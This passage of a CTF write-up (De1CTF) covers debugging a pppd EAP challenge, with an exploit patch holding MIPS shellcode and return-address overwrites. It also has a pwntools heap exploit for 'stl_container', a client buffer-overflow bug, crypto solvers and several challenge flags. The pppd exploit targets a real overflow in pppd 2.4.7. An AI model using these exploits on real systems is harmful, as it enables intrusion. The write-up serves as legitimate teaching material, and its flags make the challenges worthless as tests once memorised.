<p>接下来介绍的是如何调试的方法</p>
<p>首先题目默认关闭了network</p>
<p>在/etc/init.d/S40network, 将注释全部删掉，然后修改start.sh脚本，将-net none删除，加上-redir tcp:9999::9999 -redir tcp:4242::4242，这样就配置好network了</p>
<p>然后修改/etc/inittab 将 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ttyS0::sysinit:/pppd auth local lock defaultroute nodetach 172.16.1.1:172.16.1.2 ms-dns 8.8.8.8 require-eap lcp-max-configure 100</span><br></pre></td></tr></table></figure></p>
<p>修改为 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ttyS0::sysinit:/bin/sh</span><br></pre></td></tr></table></figure></p>
<p>然后到github下载一个<a href="https://github.com/hugsy/gdb-static/blob/master/gdbserver-7.12-mips-be" target="_blank" rel="noopener">gdbserver</a>, 重新打包一个cpio，启动</p>
<p>进入系统后默认得到一个shell，系统里面自带一个socat</p>
<p>执行 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">socat pty,link=/dev/serial,raw tcp-listen:9999 &amp;</span><br><span class="line">/pppd /dev/serial 9600 local lock defaultroute 172.16.1.1:172.16.1.2 ms-dns 8.8.8.8 require-eap lcp-max-configure 100</span><br></pre></td></tr></table></figure></p>
<p>之后执行下面的命令获取pppd的pid <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps |grep pppd</span><br></pre></td></tr></table></figure></p>
<p>使用gdbserver attach上pppd <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./gdbserver --attach 0.0.0.0:4242 pid</span><br></pre></td></tr></table></figure></p>
<p>然后在外面使用gdb-multiarch去连接gdbserver</p>
<p>之后下载一个pppd的源码，编译 执行 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">socat pty,link=/tmp/serial,rawer tcp:127.0.0.1:9999 &amp;</span><br><span class="line">pppd noauth local lock defaultroute debug nodetach /tmp/serial 9600 user notadmin password notpassword</span><br></pre></td></tr></table></figure></p>
<p>这样就成功进行调试了</p>
<p>之后根据https://gist.github.com/nstarke/551433bcc72ff95588e168a0bb666124 的操作patch源码，写exp即可</p>
<p>exp patch如下 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">--- ppp-ppp-2.4.7/pppd/eap.c    2014-08-09 12:31:39.000000000 +0000</span><br><span class="line">+++ ppp-poc/ppp-ppp-2.4.7/pppd/eap.c    2020-04-12 03:23:54.321773453 +0000</span><br><span class="line">@@ -1385,8 +1385,46 @@</span><br><span class="line">             esp-&gt;es_usedpseudo = 2;</span><br><span class="line">         &#125;</span><br><span class="line"> #endif /* USE_SRP */</span><br><span class="line">-        eap_send_response(esp, id, typenum, esp-&gt;es_client.ea_name,</span><br><span class="line">-            esp-&gt;es_client.ea_namelen);</span><br><span class="line">+        //eap_send_response(esp, id, typenum, esp-&gt;es_client.ea_name,</span><br><span class="line">+        //    esp-&gt;es_client.ea_namelen);</span><br><span class="line">+#define PAY_LEN 256</span><br><span class="line">+        char sc[PAY_LEN];</span><br><span class="line">+        memset(sc, &apos;C&apos;, PAY_LEN);</span><br><span class="line">+        int* shellcode = (int*)sc;</span><br><span class="line">+        shellcode[0]=0x3c09616c;</span><br><span class="line">+        shellcode[1]=0x3529662f;</span><br><span class="line">+        shellcode[2]=0xafa9fff8;</span><br><span class="line">+        shellcode[3]=0x2419ff98;</span><br><span class="line">+        shellcode[4]=0x3204827;</span><br><span class="line">+        shellcode[5]=0xafa9fffc;</span><br><span class="line">+        shellcode[6]=0x27bdfff8;</span><br><span class="line">+        shellcode[7]=0x3a02020;</span><br><span class="line">+        shellcode[8]=0x2805ffff;</span><br><span class="line">+        shellcode[9]=0x2806ffff;</span><br><span class="line">+        shellcode[10]=0x34020fa5;</span><br><span class="line">+        shellcode[11]=0x101010c;</span><br><span class="line">+        shellcode[12]=0xafa2fffc;</span><br><span class="line">+        shellcode[13]=0x8fa4fffc;</span><br><span class="line">+        shellcode[14]=0x3c19ffb5;</span><br><span class="line">+        shellcode[15]=0x3739c7fd;</span><br><span class="line">+        shellcode[16]=0x3202827;</span><br><span class="line">+        shellcode[17]=0x3c190101;</span><br><span class="line">+        shellcode[18]=0x373901fe;</span><br><span class="line">+        shellcode[19]=0x3c060101;</span><br><span class="line">+        shellcode[20]=0x34c60101;</span><br><span class="line">+        shellcode[21]=0x3263026;</span><br><span class="line">+        shellcode[22]=0x34020fa3;</span><br><span class="line">+        shellcode[23]=0x101010c;</span><br><span class="line">+        shellcode[24]=0x3c05004a;</span><br><span class="line">+        shellcode[25]=0x34a53800;</span><br><span class="line">+        shellcode[26]=0x20460002;</span><br><span class="line">+        shellcode[27]=0x3c190042;</span><br><span class="line">+        shellcode[28]=0x37396698;</span><br><span class="line">+        shellcode[29]=0x320f809;</span><br><span class="line">+        shellcode[30]=0x0;</span><br><span class="line">+        sc[PAY_LEN-1] = &apos;\0&apos;;</span><br><span class="line">+</span><br><span class="line">+        eap_send_response(esp, id, typenum, shellcode, PAY_LEN);</span><br><span class="line">         break;</span><br><span class="line"></span><br><span class="line">     case EAPT_NOTIFICATION:</span><br><span class="line">@@ -1452,8 +1490,21 @@</span><br><span class="line">         BZERO(secret, sizeof (secret));</span><br><span class="line">         MD5_Update(&amp;mdContext, inp, vallen);</span><br><span class="line">         MD5_Final(hash, &amp;mdContext);</span><br><span class="line">-        eap_chap_response(esp, id, hash, esp-&gt;es_client.ea_name,</span><br><span class="line">-            esp-&gt;es_client.ea_namelen);</span><br><span class="line">+        //eap_chap_response(esp, id, hash, esp-&gt;es_client.ea_name,</span><br><span class="line">+        //    esp-&gt;es_client.ea_namelen);</span><br><span class="line">+        char payload[1024];</span><br><span class="line">+                memset(payload, &apos;A&apos;, 1023);</span><br><span class="line">+                memset(payload, &apos;B&apos;, 0x2a0);</span><br><span class="line">+        int *tpayload = (int*)(payload + 0x2a0 - 4);</span><br><span class="line">+        //*tpayload = 0x040A0BC;</span><br><span class="line">+        *tpayload = 0x4083FC;</span><br><span class="line">+        //*(tpayload-1) = 0x043EF9C;</span><br><span class="line">+        *(tpayload-1) = 0x43EF9C;</span><br><span class="line">+        *(tpayload-5) = 0x4a7a0c-8;</span><br><span class="line">+</span><br><span class="line">+                payload [1023] = &apos;\0&apos;;</span><br><span class="line">+                eap_chap_response(esp, id, hash, payload, 1024);</span><br><span class="line">+        exit(0);</span><br><span class="line">         break;</span><br><span class="line"></span><br><span class="line"> #ifdef USE_SRP</span><br></pre></td></tr></table></figure></p>
<h2><span id="stl_container">stl_container</span></h2>
<p>这道题是关于c++ vector模板的一个漏洞 当vector中储存的是Object的时候，erase指定下标的Object都会调用vector中最后一个Object的析构函数 这样就有了一个UAF漏洞，接下来就利用tcache进行各种攻击</p>
<p>下面是exp <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">debug=0</span><br><span class="line"></span><br><span class="line">#context.terminal = [&apos;tmux&apos;,&apos;-x&apos;,&apos;sh&apos;,&apos;-c&apos;]</span><br><span class="line">#context.terminal = [&apos;tmux&apos;, &apos;splitw&apos;, &apos;-h&apos; ]</span><br><span class="line">context.log_level=&apos;debug&apos;</span><br><span class="line"></span><br><span class="line">if debug:</span><br><span class="line">    p=process(&apos;./stl_container&apos;)</span><br><span class="line">    #p=process(&apos;&apos;,env=&#123;&apos;LD_PRELOAD&apos;:&apos;./libc.so&apos;&#125;)</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">else:</span><br><span class="line">    p=remote(&apos;134.175.239.26&apos;,8848)</span><br><span class="line"></span><br><span class="line">def ru(x):</span><br><span class="line">    return p.recvuntil(x)</span><br><span class="line"></span><br><span class="line">def se(x):</span><br><span class="line">    p.send(x)</span><br><span class="line"></span><br><span class="line">def sl(x):</span><br><span class="line">    p.sendline(x)</span><br><span class="line"></span><br><span class="line">def add(ty, content=&apos;a&apos;):</span><br><span class="line">    sl(str(ty))</span><br><span class="line">    ru(&apos;3. show&apos;)</span><br><span class="line">    ru(&apos;&gt;&gt;&apos;)</span><br><span class="line">    sl(&apos;1&apos;)</span><br><span class="line">    ru(&apos;input data:&apos;)</span><br><span class="line">    se(content)</span><br><span class="line">    ru(&apos;&gt;&gt;&apos;)</span><br><span class="line"></span><br><span class="line">def delete(ty, idx=0):</span><br><span class="line">    sl(str(ty))</span><br><span class="line">    ru(&apos;3. show&apos;)</span><br><span class="line">    ru(&apos;&gt;&gt;&apos;)</span><br><span class="line">    sl(&apos;2&apos;)</span><br><span class="line">    if ty &lt;= 2:</span><br><span class="line">        ru(&apos;index?&apos;)</span><br><span class="line">        sl(str(idx))</span><br><span class="line">    ru(&apos;&gt;&gt;&apos;)</span><br><span class="line"></span><br><span class="line">def show(ty, idx=0):</span><br><span class="line">    sl(str(ty))</span><br><span class="line">    ru(&apos;3. show&apos;)</span><br><span class="line">    ru(&apos;&gt;&gt;&apos;)</span><br><span class="line">    sl(&apos;3&apos;)</span><br><span class="line">    ru(&apos;index?\n&apos;)</span><br><span class="line">    sl(str(idx))</span><br><span class="line">    ru(&apos;data: &apos;)</span><br><span class="line">    data = ru(&apos;\n&apos;)</span><br><span class="line">    ru(&apos;&gt;&gt;&apos;)</span><br><span class="line">    return data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ru(&apos;&gt;&gt;&apos;)</span><br><span class="line"></span><br><span class="line">add(1)</span><br><span class="line">add(1)</span><br><span class="line">add(2)</span><br><span class="line">add(2)</span><br><span class="line">add(4)</span><br><span class="line">add(4)</span><br><span class="line">add(3)</span><br><span class="line">add(3)</span><br><span class="line"></span><br><span class="line">delete(3)</span><br><span class="line">delete(3)</span><br><span class="line">delete(1)</span><br><span class="line">delete(1)</span><br><span class="line">delete(4)</span><br><span class="line">delete(4)</span><br><span class="line">delete(2)</span><br><span class="line">data = show(2)</span><br><span class="line">libc = u64(data[:6]+&apos;\0\0&apos;)</span><br><span class="line">base = libc - 0x3ebca0</span><br><span class="line">free_hook = base + 0x3ed8e8</span><br><span class="line">system = base + 0x4f440</span><br><span class="line"></span><br><span class="line">add(3, &apos;/bin/sh\0&apos;)</span><br><span class="line">delete(2)</span><br><span class="line">add(4)</span><br><span class="line">add(2)</span><br><span class="line">add(2)</span><br><span class="line">add(3, &apos;/bin/sh\0&apos;)</span><br><span class="line">delete(2)</span><br><span class="line">delete(2)</span><br><span class="line">add(1, p64(free_hook))</span><br><span class="line">add(1, p64(system))</span><br><span class="line"></span><br><span class="line">sl(&apos;3&apos;)</span><br><span class="line">ru(&apos;show&apos;)</span><br><span class="line">sl(&apos;2&apos;)</span><br><span class="line"></span><br><span class="line">print(hex(base))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
<h2><span id="mc_realworld">mc_realworld</span></h2>
<p>文件列表： <a href="https://pastebin.com/FrVCXW42" target="_blank" rel="noopener">exp.py</a> <a href="https://pastebin.com/t37qDEYw" target="_blank" rel="noopener">requirements.txt</a></p>
<p>出题人继续挖与mc相关的材料。找到了这个 <a href="https://github.com/fogleman/Craft" target="_blank" rel="noopener">fogleman/Craft</a> 。</p>
<p>游戏还蛮好的，服务端用 python 写，pwn 服务端有点难下手，而且搅屎情况更不好控制，所以打算从客户端处下手。在客户端处，埋下一个简单的 bof，在用户聊天时触发。为了防止选手集体挨打，所以限制了@特定用户时才能触发。</p>
<p>client to client的pwn题变得有趣多了，像极了A&amp;D模式。</p>
<p>回传flag成为一个问题，中间隔着一个server。预设解法是通过聊天功能回传，只能@自己，因为公屏黑名单了关键词 <code>De1CTF</code>，防止 flag 意外泄露。</p>
<p>非预期回传方式，参考上面 <code>mc_logclient</code> wp 的说明。</p>
<p>漏洞点位于客户端 <code>add_messages</code> 函数。你可以通过 <code>bindiff</code> 找到它（需要保证编译环境一致，编译器flags一致）。代码大概如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">if (text[0] == &apos;@&apos; &amp;&amp; strlen(text) &gt; 192) &#123;</span><br><span class="line">    text = text + 1;</span><br><span class="line">    char *body = text + 32;</span><br><span class="line">    size_t length;</span><br><span class="line">    char *plain = base64_decode(body, strlen(body), &amp;length);</span><br><span class="line">    char message[16] = &#123;0&#125;;</span><br><span class="line">    memcpy(&amp;message, plain, length);</span><br><span class="line">    printf(&quot;%8s&quot;, &amp;message);</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>很明显，简单 bof。</p>
<p>更多细节详见：exp.py。</p>
<p><code>De1CTF{W3_L0vE_D4nge2_ReA1_W0r1d1_CrAft!2233}</code></p>
<h1><span id="crypto">crypto</span></h1>
<h2><span id="nlfsr">NLFSR</span></h2>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf8</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lfsr</span><span class="params">(r, m)</span>:</span> <span class="keyword">return</span> ((r &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xffffff</span>) ^ (bin(r &amp; m).count(<span class="string">'1'</span>) % <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ma, mb, mc, md = <span class="number">0x505a1</span>, <span class="number">0x40f3f</span>, <span class="number">0x1f02</span>, <span class="number">0x31</span></span><br><span class="line">key = open(<span class="string">"data"</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calcR</span><span class="params">(x, y)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> len(x) == len(y)</span><br><span class="line">    cnt = <span class="number">0.0</span></span><br><span class="line">    <span class="keyword">for</span> i, j <span class="keyword">in</span> zip(x, y):</span><br><span class="line">        cnt += (i == j)</span><br><span class="line">    <span class="keyword">return</span> cnt/len(x)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brutea</span><span class="params">(nb)</span>:</span></span><br><span class="line">    relation, reala = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>**<span class="number">18</span>+<span class="number">1</span>, <span class="number">2</span>**<span class="number">19</span>):</span><br><span class="line">        s = <span class="string">''</span></span><br><span class="line">        a = i</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(nb*<span class="number">8</span>):</span><br><span class="line">            a = lfsr(a, ma)</span><br><span class="line">            s += str(a &amp; <span class="number">1</span>)</span><br><span class="line">        r = calcR(s, key[:nb*<span class="number">8</span>])</span><br><span class="line">        <span class="keyword">if</span> relation &lt; r:</span><br><span class="line">            relation, reala = r, i</span><br><span class="line">    print(reala, relation)</span><br><span class="line">    <span class="keyword">return</span> reala</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brutecd</span><span class="params">(nb)</span>:</span></span><br><span class="line">    relation, realc, reald = <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>**<span class="number">5</span>+<span class="number">1</span>, <span class="number">2</span>**<span class="number">6</span>):</span><br><span class="line">        d = i</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">2</span>**<span class="number">12</span>+<span class="number">1</span>, <span class="number">2</span>**<span class="number">13</span>):</span><br><span class="line">            c = j</span><br><span class="line">            s = <span class="string">''</span></span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> range(nb*<span class="number">8</span>):</span><br><span class="line">                c = lfsr(c, mc)</span><br><span class="line">                d = lfsr(d, md)</span><br><span class="line">                s += str((c &amp; <span class="number">1</span>) ^ (d &amp; <span class="number">1</span>))</span><br><span class="line">            r = calcR(s, key[:nb*<span class="number">8</span>])</span><br><span class="line">            <span class="keyword">if</span> relation &lt; r:</span><br><span class="line">                relation, realc, reald = r, j, i</span><br><span class="line">    print(realc, reald, relation)</span><br><span class="line">    <span class="keyword">return</span> realc, reald</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bruteb</span><span class="params">(nb, a_, c_, d_)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>**<span class="number">18</span>+<span class="number">1</span>, <span class="number">2</span>**<span class="number">19</span>):</span><br><span class="line">        b = i</span><br><span class="line">        a, c, d = a_, c_, d_</span><br><span class="line">        s = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(nb*<span class="number">8</span>):</span><br><span class="line">            a = lfsr(a, ma)</span><br><span class="line">            b = lfsr(b, mb)</span><br><span class="line">            c = lfsr(c, mc)</span><br><span class="line">            d = lfsr(d, md)</span><br><span class="line">            [ao, bo, co, do] = [k &amp; <span class="number">1</span> <span class="keyword">for</span> k <span class="keyword">in</span> [a, b, c, d]]</span><br><span class="line">            s += str((ao*bo) ^ (bo*co) ^ (bo*do) ^ co ^ do)</span><br><span class="line">        <span class="keyword">if</span> s == key[:nb*<span class="number">8</span>]:</span><br><span class="line">            print(i)</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">print</span> time.asctime()</span><br><span class="line">    a = brutea(<span class="number">15</span>)</span><br><span class="line">    <span class="keyword">print</span> time.asctime()</span><br><span class="line">    c, d = brutecd(<span class="number">20</span>)</span><br><span class="line">    <span class="keyword">print</span> time.asctime()</span><br><span class="line">    b = bruteb(<span class="number">15</span>, a, c, d)</span><br><span class="line">    <span class="keyword">print</span> time.asctime()</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"De1CTF&#123;%s&#125;"</span> % (<span class="string">''</span>.join([hex(i)[<span class="number">2</span>:] <span class="keyword">for</span> i <span class="keyword">in</span> [a, b, c, d]]))</span><br><span class="line">  </span><br><span class="line"><span class="comment">#De1CTF&#123;58bb578d5611363f&#125;</span></span><br></pre></td></tr></table></figure>
<h2><span id="easyrsa">easyRSA</span></h2>
<p>This is a common modules attack but when the task is about end someone tell me that this challenge is same as the challenge in D^3CTF <a href="https://github.com/D-3CTF/D3CTF-2019-Challenges" target="_blank" rel="noopener">Common</a>. Last year I didn't look at the crypto challenge in this task. So I want to make a sincere apology to the person, <a href="https://gist.github.com/LurkNoi" target="_blank" rel="noopener">Lurkrul</a> ,who made the challenge. Sorry about this.</p>
<p>And here is the solution:</p>
<p>In this a RSA task. We can find out that the e has been generated by this way: <span class="math display">\[
e_1d_1 = 1 + k_1\lambda(N)
\]</span></p>
<p><span class="math display">\[
e_2d_2 = 1 + k_2\lambda(N)
\]</span></p>
<p>And there are some limits: <span class="math display">\[
limit = \sqrt[3]{N}
\]</span></p>
<p><span class="math display">\[
limit &lt; r &lt; 0x1000000000001 * limit
\]</span></p>
<p><span class="math display">\[
d_i = nextPrime(r)
\]</span></p>
<p><span class="math display">\[
e_i \approx N
\]</span></p>
<p>We choose a random <span class="math inline">\(e\)</span> in <span class="math inline">\([e_1\)</span> , <span class="math inline">\(e_2]\)</span> to encrypt flag, <span class="math display">\[
flag^{e} \equiv cipher \pmod n
\]</span> And give these parameters: <span class="math display">\[
N,e1,e2,cipher
\]</span> In this task, we can get some equation: <span class="math display">\[
e_id_i = 1 + k_i \lambda(N) = 1 + \frac {k_i}{g} \Phi(N) = 1 + \frac {k_i}{g} (N-s)
\]</span> And we rewrite it as: <span class="math display">\[
W_i: e_id_ig - k_iN = g - k_is
\]</span> This equation is the starting point for Wiener's attack.</p>
<p>Also we can get this easily: <span class="math display">\[
G_{i,j}: k_ie_jd_j - k_je_id_i = k_i - k_j
\]</span> This equation is the starting point for Guo's common modulus attack.</p>
<p>Then we assume: <span class="math display">\[
k_2W_1: k_2e_1d_1g - k_2k_1N = k_2(g-k_1s)
\]</span></p>
<p><span class="math display">\[
gG_{1,2} : k_1e_2d_2g - k_2e_1d_1g = g(k_1-k_2)
\]</span></p>
<p><span class="math display">\[
W_1W_2 : d_1d_2g^2e_1e_2 - d_1k_2ge_1N - d_2k_1ge_2N + k_1k_2N^2 = (g-k_1s)(g-k_2s)
\]</span></p>
<p>Along with the trivial equation: <span class="math display">\[
k1k2 = k2k1
\]</span> can be written as the vector-matrix equation: <span class="math display">\[
x_2B_2 = v_2
\]</span> where: <span class="math display">\[
x_2 = (k_1k_2,k_2d_1g,k_1d_2g,d_1d_2g^2)
\]</span></p>
<p><span class="math display">\[
B_2 = \begin{bmatrix}1 &amp; -N &amp; 0 &amp; N^2 \\  &amp; e_1 &amp; - e_1 &amp; -e_1N\\ &amp; &amp; e_2 &amp; -e_2N \\ &amp; &amp; &amp; e_1e_2\end{bmatrix}
\]</span></p>
<p><span class="math display">\[
v_2 = (k_1k_2,k_2(g-k_1s),g(k_1-k_2),(g-k_1s)(g-k_2s))
\]</span></p>
<p>The vector <span class="math inline">\(v_2\)</span> is an integer linear combination of the rows in <span class="math inline">\(B_2\)</span>, and is therefore a vector in the lattice <span class="math inline">\(L_2\)</span>generated by the rows of <span class="math inline">\(B_2\)</span>.</p>
<p>And the size of <span class="math inline">\(v_2\)</span>, coming from the dominant last component, is roughly <span class="math display">\[
k_1k_2s^2 \approx N^{2\delta_2+1} = N^{2(\delta_2+1/2)}
\]</span></p>
<p><span class="math display">\[
\delta_2 = 0.357 - \epsilon \ , \ \epsilon \ is \ small
\]</span></p>
<p>Since the components of <span class="math inline">\(v_2\)</span> are not the same size, we can consider the modified vector-matrix equation: <span class="math display">\[
x_2B_2D_2 = v_2D_2
\]</span> Where <span class="math inline">\(D_2\)</span> is the diagonal matrix: <span class="math display">\[
D_2 = \begin{bmatrix}N &amp;  &amp;  &amp;  \\  &amp;  N^{(1/2)} &amp; &amp; \\ &amp; &amp; N^{1+\delta_2} &amp;  \\ &amp; &amp; &amp; 1\end{bmatrix}
\]</span> Letting: <span class="math display">\[
v^{&#39;}_2 = v_2D_2
\]</span> Thus: <span class="math display">\[
v^{&#39;}_2 = (k_1k_2N,k2(g-k_1s)N^{(1/2)},g(k_1-k_2)N^{1+\delta_2},(g-k_1s)(g-k_2s))
\]</span> We can use LLL to get <span class="math inline">\(v^{&#39;}_2\)</span> and solve:<br>
<span class="math display">\[
x_2B_2D_2 = v^{&#39;}_2
\]</span> to get <span class="math inline">\(x_2\)</span></p>
<p>Finally we can get <span class="math inline">\(\Phi(N)\)</span> by: <span class="math display">\[
\Phi(N) = \lfloor {e_1 \frac {x_2[2]}{x_2[1]}}\rfloor
\]</span> So we can decrypt the cipher to get flag !</p>
<p>If you want to know more details about this attack, take a look at this <a href="https://sci-hub.tw/https://link.springer.com/chapter/10.1007/3-540-46701-7_14" target="_blank" rel="noopener">paper</a>.</p>
<p>Reference:</p>
<p>https://sci-hub.tw/https://link.springer.com/chapter/10.1007/3-540-46701-7_14</p>
<p>https://eprint.iacr.org/2009/037.pdf</p>
<h2><span id="ecdh">ECDH</span></h2>
<p>In this task we can see a <a href="%5Bhttps://en.wikipedia.org/wiki/Elliptic-curve_Diffie%E2%80%93Hellman%5D(https://en.wikipedia.org/wiki/Elliptic-curve_Diffie–Hellman)">ECDH</a> system. We can exchange keys and encrypt message to get result. So we can get the exchanged keys by encrypting our message. Also there is a backdoor, if you give server the secret, the server will give you flag.</p>
